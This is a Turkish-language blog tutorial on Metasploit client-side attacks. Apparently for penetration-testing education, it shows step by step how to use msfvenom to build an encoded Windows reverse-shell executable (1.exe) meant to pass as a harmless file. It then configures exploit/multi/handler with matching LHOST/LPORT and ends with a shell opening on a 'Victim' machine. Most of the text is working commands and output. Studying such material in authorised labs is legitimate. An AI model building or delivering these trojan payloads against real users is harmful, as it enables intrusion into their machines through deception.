---
draft: false

title:  'MSF Binary Payloads'
date: '2017-05-20T13:10:00+03:00'
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))

description:  'İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar.' 
 
url:  /tr/msf-binary-payloads/
 
featured_image: /images/metasploit.jpg
categories:
    - 'Metasploit Framework'
tags:
    - cybersecurity
    - 'metasploit framework'
---


## İstemci Taraflı Saldırılar



İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar.



Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir.



Metasploit Framework, bu tür zararlı kodların oluşturması için bir çok modül sağlamaktadır.



## binary payloads



binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır.



Bu yazıda, Metasploit Framework tarafından sağlanan `msfvenom` komut satırı aracı kullanılacaktır. `msfvenom` kullanarak `.exe`, `perl` veya `c` program çıktıları elde edebilirsiniz. Burada `.exe` formatı kullanılacaktır.



## Windows Reverse Shell Açan Payload Oluşturma



Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için `windows/shell/reverse_tcp` modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım.


```bash
root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
Options **for **payload/windows/shell/reverse_tcp:


       Name: Windows Command Shell, Reverse TCP Stager
     Module: payload/windows/shell/reverse_tcp
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 281
       Rank: Normal

Provided by:
    spoonm 
    sf 
    hdm 
    skape 

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique **(**Accepted: '', seh, thread, process, none**)**
LHOST                      yes       The listen address
LPORT     4444             yes       The listen port

Description:
  Spawn a piped command shell **(**staged**)**. Connect back to the attacker
```



Bu modül, çıktıda görüldüğü gibi `LHOST` ve `LPORT` değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de `x86/shikata_ga_nai` encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak `/tmp` klasörünün içinde `1.exe` isimli bir dosya oluşturacaktır.


```bash
root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST**=**172.16.104.130 LPORT**=**31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 **(**iteration**=**0**)**
x86/shikata_ga_nai chosen with final size 326
Payload size: 326 bytes
Saved as: /tmp/1.exe
```



`1.exe` dosyamızın türünü kontrol edelim. `file` komutuyla yaptığımız kontrolde `1.exe` doyasının MS Windows dosyası olduğu aşağıda görülmektedir.


```bash
root@kali:~# file /tmp/1.exe
/tmp/1.exe: PE32 executable **(**GUI**)** Intel 80386, **for **MS Windows
```



## Dinleme Ayarları



Elimizde istemcinin tıklayıp çalıştıracağı `1.exe` dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için `exploit/multi/handler` modülünü ve içinde `payload windows/shell/reverse_tcp` dinleyici payload u kullanacağız.



Öncelikle `exploit/multi/handler` modülünü yükleyip seçeneklere bakalım.


```bash
msf **&gt;** use exploit/multi/handler
msf exploit**(**handler**)** **&gt;** show options

Module options:

   Name  Current Setting  Required  Description 
   ----  ---------------  --------  ----------- 


Exploit target:

   Id  Name            
   --  ----            
   0   Wildcard Target
```



Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmuyor. Şimdi payload ayarlaması yapalım.


```bash
msf exploit**(**handler**)** **&gt;** set payload windows/shell/reverse_tcp
payload **=&gt;** windows/shell/reverse_tcp
msf exploit**(**handler**)** **&gt;** show options

Module options:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options **(**windows/shell/reverse_tcp**)**:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST                      yes       The local address
   LPORT     4444             yes       The local port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target 
```



Bu çıktıda görülmektedir ki Payload için `LHOST` ve `LPORT` değerlerinin girilmesi gerekmekte.



`LHOST`: Local Host yani yerelde dinleyecek IP adresini,



`LPORT`: Local Port, yani dinleyecek Port numarasını ifade eder.



Bu değerlerin, `msfvenom` komutuyla oluşturduğumuz `1.exe` dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin. `1.exe` dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir.


```bash
msf exploit**(**handler**)** **&gt;** set LHOST 172.16.104.130
LHOST **=&gt;** 172.16.104.130
msf exploit**(**handler**)** **&gt;** set LPORT 31337
LPORT **=&gt;** 31337
msf exploit**(**handler**)** **&gt;**
```



Tüm ayarlamaları yaptıktan sonra `exploit` komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir.


```bash
msf exploit**(**handler**)** **&gt;** exploit

**[*********]** Handler binding to LHOST 0.0.0.0
**[*********]** Started reverse handler
**[*********]** Starting the payload handler...
**[*********]** Sending stage **(**474 bytes**)**
**[*********]** Command shell session 2 opened **(**172.16.104.130:31337 -&gt; 172.16.104.128:1150**)**

Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Victim\My Documents&gt;
```
